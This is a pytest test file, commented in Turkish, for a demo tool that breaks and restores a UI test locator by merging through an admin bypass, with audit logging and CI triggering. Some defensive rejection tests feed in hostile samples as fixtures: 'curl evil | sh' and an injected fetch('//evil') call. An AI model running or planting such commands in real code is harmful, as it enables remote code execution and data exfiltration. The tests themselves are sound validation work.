"""forge_demo: demo locator kırılması / baseline'a dönüş (gerçek git, sahte denetim)."""

from __future__ import annotations

import io
import json
import os
import shutil
import subprocess
import tarfile
from collections.abc import Mapping
from pathlib import Path
from typing import Any

import pytest

from tp_core.integrations import forge_demo
from tp_core.integrations.forge import ForgeConflictError, ForgeError, ForgeValidationError
from tp_core.integrations.forge_demo import (
    AUDIT_BASELINE,
    AUDIT_BREAK,
    BREAK_BRANCH,
    break_locator,
    restore_baseline,
)
from tp_core.integrations.forge_local import LocalForge

GIT_ENV = {
    "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
    "HOME": "/tmp",
    "LC_ALL": "C",
    "GIT_CONFIG_NOSYSTEM": "1",
    "GIT_CONFIG_GLOBAL": os.devnull,
    "GIT_AUTHOR_NAME": "seed",
    "GIT_AUTHOR_EMAIL": "seed@example.test",
    "GIT_COMMITTER_NAME": "seed",
    "GIT_COMMITTER_EMAIL": "seed@example.test",
}


def git(*args: str, cwd: Path | None = None, git_dir: Path | None = None) -> str:
    cmd = ["git"] + (["--git-dir", str(git_dir)] if git_dir is not None else [])
    out = subprocess.run(
        [*cmd, *args], cwd=cwd, env=GIT_ENV, capture_output=True, check=True, text=True
    )
    return out.stdout.strip()


pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="git yok")

CATALOG = """export function Card() {
  return <button data-testid="add-to-cart">Sepete ekle</button>;
}
"""
E2E_LOCATORS = "export const catalog = { addToCart: 'add-to-cart' };\n"


class FakeCi:
    def __init__(self, fail: bool = False) -> None:
        self.calls: list[tuple[str, str]] = []
        self.fail = fail

    def __call__(self, sha: str, actor: str) -> str:
        self.calls.append((sha, actor))
        if self.fail:
            raise OSError("db yok")
        return f"run-{len(self.calls)}"


class FakeAudit:
    def __init__(self) -> None:
        self.rows: list[tuple[str, str, str | None, dict[str, Any]]] = []

    def append(self, aktor: str, eylem: str, nesne: str | None, ozet: Mapping[str, Any]) -> int:
        self.rows.append((aktor, eylem, nesne, dict(ozet)))
        return len(self.rows)


@pytest.fixture
def demo_bare(tmp_path: Path) -> Path:
    """scripts/forge-init.sh ile aynı biçim: main + demo-baseline + demo/break-locator."""
    work = tmp_path / "work"
    (work / "web" / "src").mkdir(parents=True)
    (work / "e2e" / "pages").mkdir(parents=True)
    (work / "web" / "Dockerfile").write_text("FROM scratch\n")
    (work / "web" / "src" / "CatalogPage.tsx").write_text(CATALOG)
    # e2e'deki locator değeri web/src dışında: testid durumunu etkilememeli.
    (work / "e2e" / "pages" / "locators.ts").write_text(E2E_LOCATORS)
    git("init", "-q", "-b", "main", str(work))
    git("add", "-A", cwd=work)
    git("commit", "-q", "-m", "baslangic", cwd=work)
    git("tag", "demo-baseline", cwd=work)
    git("checkout", "-q", "-b", BREAK_BRANCH, cwd=work)
    (work / "web" / "src" / "CatalogPage.tsx").write_text(
        CATALOG.replace("add-to-cart", "cart-add")
    )
    git("commit", "-q", "-am", "kirilma", cwd=work)
    repo = tmp_path / "forge" / "demo-app.git"
    repo.parent.mkdir()
    git("init", "-q", "--bare", "-b", "main", str(repo))
    git("push", "-q", str(repo), "main", BREAK_BRANCH, "--tags", cwd=work)
    return repo


@pytest.fixture
def forge(demo_bare: Path, tmp_path: Path) -> LocalForge:
    artifacts = tmp_path / "artifacts"
    (artifacts / "checks").mkdir(parents=True)
    return LocalForge(demo_bare, artifacts)


def test_break_main_head_cart_add_icerir(forge: LocalForge) -> None:
    audit = FakeAudit()
    before = forge.head_sha()
    assert forge_demo.testid_state(forge) == "add-to-cart"

    out = break_locator(forge, audit)

    assert out.changed is True
    assert out.testid == "cart-add"
    assert out.main_before == before and out.main_after == forge.head_sha()
    # main HEAD artık cart-add içerir, add-to-cart içermez (web/src)
    page = forge.read_file("web/src/CatalogPage.tsx")
    assert 'data-testid="cart-add"' in page and "add-to-cart" not in page
    assert out.merge is not None and out.merge.bypass is True
    assert out.merge.actor == "demo-admin"
    assert out.merge.sha == forge.head_sha(BREAK_BRANCH)
    rec = forge.get_pr_record(out.pr_number or 0)
    assert (rec["state"], rec["merged_by"], rec["bypass"]) == ("merged", "demo-admin", True)
    assert rec["labels"] == ["demo"]
    # denetim: tek "demo kırılması" olayı, bypass ve sha'lar dahil
    assert len(audit.rows) == 1
    aktor, eylem, nesne, ozet = audit.rows[0]
    assert (aktor, eylem, nesne) == ("demo-admin", AUDIT_BREAK, f"pr:{out.pr_number}")
    assert ozet["bypass"] is True and "local-ci" in ozet["bypass_nedeni"]
    assert ozet["main_once"] == before and ozet["merge_sha"] == out.main_after
    assert ozet["testid"] == {"once": "add-to-cart", "sonra": "cart-add"}
    assert out.audit_id == 1


def test_break_idempotent(forge: LocalForge) -> None:
    audit = FakeAudit()
    break_locator(forge, audit)
    again = break_locator(forge, audit)
    assert again.changed is False and again.testid == "cart-add"
    assert len(audit.rows) == 1  # değişiklik yok → yeni denetim olayı yok


def test_break_onaylanan_head_disinda_merge_etmez(
    forge: LocalForge, monkeypatch: pytest.MonkeyPatch
) -> None:
    """PR açıldıktan sonra dal ilerlerse merge reddedilir; denetime bypass yazılmaz."""
    real_open = forge.open_pr

    def open_then_push(*a: Any, **kw: Any) -> Any:
        pr = real_open(*a, **kw)
        forge.commit_files(BREAK_BRANCH, {"web/src/extra.ts": "x\n"}, "sonradan")
        return pr

    monkeypatch.setattr(forge, "open_pr", open_then_push)
    audit = FakeAudit()
    main = forge.head_sha()
    with pytest.raises(ForgeConflictError):
        break_locator(forge, audit)
    assert forge.head_sha() == main
    assert audit.rows == []


def test_break_dal_beklenen_kirilmayi_icermiyorsa(forge: LocalForge, demo_bare: Path) -> None:
    git("update-ref", f"refs/heads/{BREAK_BRANCH}", "demo-baseline", git_dir=demo_bare)
    with pytest.raises(ForgeError, match="beklenen kırılmayı"):
        break_locator(forge, FakeAudit())


def test_baseline_geri_doner_ve_denetler(forge: LocalForge) -> None:
    audit = FakeAudit()
    base = forge.head_sha("demo-baseline")
    broken = break_locator(forge, audit)
    out = restore_baseline(forge, audit)
    assert out.changed is True
    assert (out.main_before, out.main_after) == (broken.main_after, base)
    assert forge.head_sha() == base and forge_demo.testid_state(forge) == "add-to-cart"
    assert [r[1] for r in audit.rows] == [AUDIT_BREAK, AUDIT_BASELINE]
    assert restore_baseline(forge, audit).changed is False
    assert len(audit.rows) == 2
    # baseline'dan sonra kırılma yeniden çalışır (demo provası ×3)
    again = break_locator(forge, audit)
    assert again.changed is True and forge_demo.testid_state(forge) == "cart-add"


def test_baseline_github_desteklenmez() -> None:
    class NoReset:
        pass

    with pytest.raises(ForgeValidationError):
        restore_baseline(NoReset(), FakeAudit())


def test_cli_break_status_archive(
    forge: LocalForge,
    demo_bare: Path,
    tmp_path: Path,
    capfdbinary: pytest.CaptureFixture[bytes],
) -> None:
    env = {
        "TP_FORGE": "local",
        "TP_FORGE_PATH": str(demo_bare),
        "TP_ARTIFACTS_PATH": str(tmp_path / "artifacts"),
    }
    audit = FakeAudit()
    assert forge_demo.main(["status"], env=env) == 0
    st = json.loads(capfdbinary.readouterr().out)
    assert st["testid"] == "add-to-cart"
    assert st["main_baseline_mi"] is True and st["baseline"] == st["main"]
    assert forge_demo.main(["break"], env=env, audit=audit) == 0
    out = json.loads(capfdbinary.readouterr().out)
    assert out["changed"] is True and out["testid"] == "cart-add"
    assert len(audit.rows) == 1
    assert forge_demo.main(["status"], env=env) == 0
    st = json.loads(capfdbinary.readouterr().out)
    assert st["main_baseline_mi"] is False and st["main"] != st["baseline"]

    assert forge_demo.main(["archive", "--ref", "main", "--path", "web"], env=env) == 0
    raw = capfdbinary.readouterr().out
    with tarfile.open(fileobj=io.BytesIO(raw)) as tar:
        page = tar.extractfile("src/CatalogPage.tsx")
        assert page is not None and b'"cart-add"' in page.read()
        assert "Dockerfile" in tar.getnames()

    assert forge_demo.main(["archive", "--path", "yok"], env=env) == 2
    assert b"HATA" in capfdbinary.readouterr().err


def test_cli_denetim_yoksa_forgea_dokunmaz(
    forge: LocalForge,
    demo_bare: Path,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capfdbinary: pytest.CaptureFixture[bytes],
) -> None:
    def no_db() -> Any:
        raise OSError("bağlantı reddedildi")

    monkeypatch.setattr(forge_demo, "_pg_audit", no_db)
    env = {"TP_FORGE": "local", "TP_FORGE_PATH": str(demo_bare)}
    main = forge.head_sha()
    assert forge_demo.main(["break"], env=env) == 3
    assert b"denetim" in capfdbinary.readouterr().err
    assert forge.head_sha() == main
    assert forge.find_open_pr(BREAK_BRANCH) is None


# ---------------------------------------------------------------------- push CI (on: push)


def test_break_ve_baseline_main_icin_push_ci_tetikler(forge: LocalForge) -> None:
    audit, ci = FakeAudit(), FakeCi()
    out = break_locator(forge, audit, ci=ci)
    assert ci.calls == [(out.main_after, "demo-admin")]
    assert (out.ci_run_id, out.ci_error) == ("run-1", None)
    assert audit.rows[0][3]["ci"] == {"tetik": "push", "run_id": "run-1", "hata": None}
    # idempotent tekrar: main değişmedi → CI yok
    break_locator(forge, audit, ci=ci)
    assert len(ci.calls) == 1
    base = restore_baseline(forge, audit, ci=ci)
    assert ci.calls[-1] == (base.main_after, "demo-admin") and base.ci_run_id == "run-2"
    assert audit.rows[-1][3]["ci"]["run_id"] == "run-2"
    restore_baseline(forge, audit, ci=ci)
    assert len(ci.calls) == 2


def test_break_ci_hatasi_merge_geri_alinmaz_denetime_yazilir(forge: LocalForge) -> None:
    audit = FakeAudit()
    out = break_locator(forge, audit, ci=FakeCi(fail=True))
    assert out.changed is True and forge_demo.testid_state(forge) == "cart-add"
    assert out.ci_run_id is None and "db yok" in (out.ci_error or "")
    assert "db yok" in audit.rows[0][3]["ci"]["hata"]


def test_break_bayat_dal_demo_admin_ile_merge_commit(forge: LocalForge, demo_bare: Path) -> None:
    """main ilerlemişken (codegen merge'leri) kırılma dalı bayat: demo-admin bypass'ı nedeniyle."""
    forge.commit_files("tp/case-x", {"e2e/tests/x.spec.ts": "// x\n"}, "x")
    forge.require_up_to_date = False
    forge.merge_pr(forge.open_pr("tp/case-x", "x", "").number, "demo-admin")
    forge.require_up_to_date = True
    audit, ci = FakeAudit(), FakeCi()
    out = break_locator(forge, audit, ci=ci)
    assert out.merge is not None and out.merge.method == "merge-commit"
    assert "güncel değil" in (out.merge.bypass_reason or "")
    assert ci.calls == [(out.main_after, "demo-admin")]


def test_cli_break_push_ci_kosusu_postgresde(
    forge: LocalForge,
    demo_bare: Path,
    tmp_path: Path,
    engine: Any,
    capfdbinary: pytest.CaptureFixture[bytes],
) -> None:
    """make break → `demo.await_web` işi (uygulama main'i yansıtınca push CI; yarış yok)."""
    from sqlalchemy import select
    from sqlalchemy.orm import Session

    from tp_core.models import Job, Run

    env = {
        "TP_FORGE": "local",
        "TP_FORGE_PATH": str(demo_bare),
        "TP_ARTIFACTS_PATH": str(tmp_path / "artifacts"),
    }
    assert forge_demo.main(["break"], env=env, audit=FakeAudit()) == 0
    out = json.loads(capfdbinary.readouterr().out)
    assert out["ci_error"] is None and out["ci_run_id"].startswith("await-web:")
    with Session(engine) as s:
        # CI hemen kuyruğa girmez: demo-app-web yeniden derlenmeden koşu `environment` olurdu.
        assert s.scalars(select(Run)).all() == []
        jobs = s.scalars(select(Job).where(Job.tur == "demo.await_web")).all()
        assert len(jobs) == 1
        assert str(jobs[0].id) == out["ci_run_id"].removeprefix("await-web:")
        assert jobs[0].yuk["sha"] == forge.head_sha()
        assert jobs[0].yuk["eylem"] == "break" and jobs[0].yuk["isteyen"] == "demo-admin"


# ------------------------------------------------- bypass yalnızca doğrulanmış testid değişimi


def _push_break(forge: LocalForge, files: dict[str, str]) -> None:
    forge.commit_files(BREAK_BRANCH, files, "ek değişiklik")


def _assert_dokunulmadi(forge: LocalForge, main: str, audit: FakeAudit) -> None:
    assert forge.head_sha() == main
    assert forge.find_open_pr(BREAK_BRANCH) is None  # PR bile açılmaz
    assert audit.rows == []


@pytest.mark.parametrize(
    ("files", "match"),
    [
        # web/src dışı (ör. CI/e2e) kod
        ({"ci/run.sh": "curl evil | sh\n"}, "dışını değiştiriyor"),
        # aynı dosyada testid dışında satır değişikliği
        (
            {
                "web/src/CatalogPage.tsx": CATALOG.replace("add-to-cart", "cart-add").replace(
                    "Sepete ekle", "Sepete ekle{fetch('//evil')}"
                )
            },
            "beklenmeyen değişiklik",
        ),
        # satır ekleme
        (
            {"web/src/CatalogPage.tsx": CATALOG.replace("add-to-cart", "cart-add") + "evil();\n"},
            "satır ekliyor",
        ),
        # web/src altında yeni dosya
        ({"web/src/evil.ts": "export const x = 'cart-add';\n"}, "mevcut dosyada"),
    ],
)
def test_break_dal_yalnizca_testid_degisimi_icermezse_reddeder(
    forge: LocalForge, files: dict[str, str], match: str
) -> None:
    _push_break(forge, files)
    audit, main = FakeAudit(), forge.head_sha()
    with pytest.raises(ForgeError, match=match):
        break_locator(forge, audit)
    _assert_dokunulmadi(forge, main, audit)


def test_break_cok_dosya_reddedilir(forge: LocalForge) -> None:
    _push_break(forge, {f"web/src/f{i}.ts": "x\n" for i in range(forge_demo.MAX_BREAK_FILES)})
    audit, main = FakeAudit(), forge.head_sha()
    with pytest.raises(ForgeError, match="çok dosya"):
        break_locator(forge, audit)
    _assert_dokunulmadi(forge, main, audit)


def test_break_ikili_icerik_reddedilir(forge: LocalForge, demo_bare: Path, tmp_path: Path) -> None:
    """Geçersiz UTF-8 baytları 'replace' ile eşit görünmesin."""
    work = tmp_path / "w2"
    git("clone", "-q", str(demo_bare), str(work))
    (work / "web" / "src" / "logo.bin").write_bytes(b"\xff\x00")
    git("add", "-A", cwd=work)
    git("commit", "-q", "-m", "ikili", cwd=work)
    git("push", "-q", "origin", "main", cwd=work)  # main: ikili dosya (\xff)
    git("checkout", "-q", BREAK_BRANCH, cwd=work)
    git("merge", "-q", "--no-edit", "main", cwd=work)  # main'i dala al: ortak ata = main
    (work / "web" / "src" / "logo.bin").write_bytes(b"\xfe\x00")
    git("commit", "-q", "-am", "ikili degisim", cwd=work)
    git("push", "-q", "origin", BREAK_BRANCH, cwd=work)
    audit, main = FakeAudit(), forge.head_sha()
    with pytest.raises(ForgeError, match="metin olmayan"):
        break_locator(forge, audit)
    _assert_dokunulmadi(forge, main, audit)


def test_break_dogrulama_sonrasi_dal_ilerlerse_merge_etmez(
    forge: LocalForge, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Fark doğrulandıktan sonra (PR açılmadan) dala push: PR head ≠ doğrulanan head → red."""
    real_open = forge.open_pr

    def push_then_open(*a: Any, **kw: Any) -> Any:
        forge.commit_files(BREAK_BRANCH, {"ci/run.sh": "evil\n"}, "yarış")
        return real_open(*a, **kw)

    monkeypatch.setattr(forge, "open_pr", push_then_open)
    audit, main = FakeAudit(), forge.head_sha()
    with pytest.raises(ForgeError, match="doğrulanan head"):
        break_locator(forge, audit)
    assert forge.head_sha() == main
    assert audit.rows == []


def test_break_denetimde_fark_ozeti(forge: LocalForge) -> None:
    audit = FakeAudit()
    head = forge.head_sha(BREAK_BRANCH)
    base = forge.head_sha("demo-baseline")
    out = break_locator(forge, audit)
    assert out.changed is True
    assert audit.rows[0][3]["fark"] == {
        "head": head,
        "taban": base,
        "dosyalar": ["web/src/CatalogPage.tsx"],
        "degisen_satir": 1,
    }


def test_break_bayat_dalda_fark_ortak_atadan(forge: LocalForge) -> None:
    """main ilerlediyse (e2e dosyası eklendi) fark üç noktalıdır: main'in eklemeleri sayılmaz."""
    forge.commit_files("tp/case-y", {"e2e/tests/y.spec.ts": "// y\n"}, "y")
    forge.require_up_to_date = False
    forge.merge_pr(forge.open_pr("tp/case-y", "y", "").number, "demo-admin")
    forge.require_up_to_date = True
    fark = forge_demo.verify_break_diff(forge, forge.head_sha(BREAK_BRANCH))
    assert fark["dosyalar"] == ["web/src/CatalogPage.tsx"]
    assert forge.merge_base("main", BREAK_BRANCH) == forge.head_sha("demo-baseline")


# ------------------------------------------------- web-state (forge-init.sh idempotentliği)


def test_tree_sha_web_agaci(forge: LocalForge, demo_bare: Path) -> None:
    main = forge.head_sha()
    assert forge.tree_sha(main, "web") == git("rev-parse", f"{main}:web", git_dir=demo_bare)
    assert forge.tree_sha("main", "yok") is None
    assert forge.tree_sha("main", "web/Dockerfile") is None  # dizin değil


def test_web_state_ayni_commit_guncel(forge: LocalForge) -> None:
    main = forge.head_sha()
    ws = forge_demo.web_state(
        forge, build_json={"sha": main, "web_tree": ""}, sha_file=main + "\n", busy=[]
    )
    assert ws["guncel"] is True and ws["sha_dosyasi_guncel"] is True
    assert ws["main"] == main and ws["mesgul"] == []


def test_web_state_ayni_web_agaci_guncel_sha_dosyasi_eski(forge: LocalForge) -> None:
    base = forge.head_sha()
    break_locator(forge, FakeAudit(), ci=FakeCi())
    restore_baseline(forge, FakeAudit(), ci=FakeCi())
    # main baseline'a döndü (aynı sha); farklı bir commit'ten ama aynı web/ ağacı:
    tree = forge.tree_sha("main", "web")
    ws = forge_demo.web_state(
        forge, build_json={"sha": "d" * 40, "web_tree": tree}, sha_file="d" * 40, busy=None
    )
    assert ws["guncel"] is True and ws["neden"] == "aynı web/ ağacı"
    assert ws["sha_dosyasi_guncel"] is False and ws["mesgul"] is None
    assert ws["main"] == base


def test_web_state_kirik_main_eski_imaj_guncel_degil(forge: LocalForge) -> None:
    base = forge.head_sha()
    base_tree = forge.tree_sha(base, "web")
    out = break_locator(forge, FakeAudit(), ci=FakeCi())
    ws = forge_demo.web_state(
        forge, build_json={"sha": base, "web_tree": base_tree}, sha_file=base, busy=[]
    )
    assert ws["guncel"] is False and ws["main"] == out.main_after
    assert ws["main_web_tree"] != base_tree


@pytest.mark.parametrize(
    ("build", "neden"),
    [(None, "okunamadı"), ({"service": "demo-app-web", "sha": "", "web_tree": ""}, "çalışma")],
)
def test_web_state_bilinmeyen_calisan_guncel_degil(
    forge: LocalForge, build: dict[str, Any] | None, neden: str
) -> None:
    ws = forge_demo.web_state(forge, build_json=build, sha_file=None)
    assert ws["guncel"] is False and neden in ws["neden"]
    assert ws["sha_dosyasi_guncel"] is False


def test_cli_web_state(
    forge: LocalForge,
    demo_bare: Path,
    monkeypatch: pytest.MonkeyPatch,
    capfdbinary: pytest.CaptureFixture[bytes],
) -> None:
    env = {"TP_FORGE": "local", "TP_FORGE_PATH": str(demo_bare)}
    main = forge.head_sha()
    monkeypatch.setattr(forge_demo, "_web_inputs", lambda: ({"sha": main}, main))
    monkeypatch.setattr(forge_demo, "_busy_jobs", lambda: [{"id": "j1", "tur": "ci.run"}])
    assert forge_demo.main(["web-state"], env=env) == 0
    ws = json.loads(capfdbinary.readouterr().out)
    assert ws["guncel"] is True and ws["mesgul"] == [{"id": "j1", "tur": "ci.run"}]

    def no_db() -> Any:
        raise OSError("bağlantı reddedildi")

    monkeypatch.setattr(forge_demo, "_busy_jobs", no_db)
    assert forge_demo.main(["web-state"], env=env) == 0
    cap = capfdbinary.readouterr()
    assert json.loads(cap.out)["mesgul"] is None and b"UYARI" in cap.err


def test_e2e_testid_ve_locator_durumu() -> None:
    from tp_core.integrations import forge_demo as fd

    class _F:
        def __init__(self, metin: str | None) -> None:
            self.metin = metin

        def read_file(self, path: str, ref: str = "main") -> str:
            assert path == fd.E2E_LOCATOR_PATH
            if self.metin is None:
                raise FileNotFoundError(path)
            return self.metin

    satir = 'addToCart: { testId: "%s", role: "button", name: "Sepete ekle" },'
    assert fd.e2e_testid_state(_F(satir % "add-to-cart")) == "add-to-cart"  # type: ignore[arg-type]
    assert fd.e2e_testid_state(_F(satir % "cart-add")) == "cart-add"  # type: ignore[arg-type]
    assert fd.e2e_testid_state(_F(None)) is None  # type: ignore[arg-type]
    assert fd.locator_durumu("add-to-cart", "add-to-cart") == "baseline"
    assert fd.locator_durumu("cart-add", "add-to-cart") == "kirik"
    assert fd.locator_durumu("cart-add", "cart-add") == "onarildi"
    assert fd.locator_durumu("belirsiz", None) is None
